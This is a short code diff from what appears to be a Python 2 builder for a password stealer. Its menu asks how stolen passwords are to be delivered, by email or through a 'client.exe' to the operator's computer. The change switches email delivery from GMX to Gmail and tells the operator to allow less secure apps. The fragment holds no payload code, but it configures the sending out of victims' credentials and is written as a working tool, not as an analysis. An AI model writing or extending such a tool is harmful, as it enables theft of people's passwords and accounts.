@@ -22,7 +22,7 @@ serverlineStop = 232
 while loop == True:
     os.system("cls")
     print "You are using V3.1.2\n\nChoose how you want the passwords delivered\n"
-    print "(1) - via email (only GMX supported, example@gmx.com)\n"
+    print "(1) - via email (only Gmail supported, example@gmail.com. Make sure you turn on 'allow less secure apps')\n"
     print "(2) - via the client.exe (to your computer directly)\n"
     option = raw_input('\nChoose a number [1-2]: ')
     if option == "1":
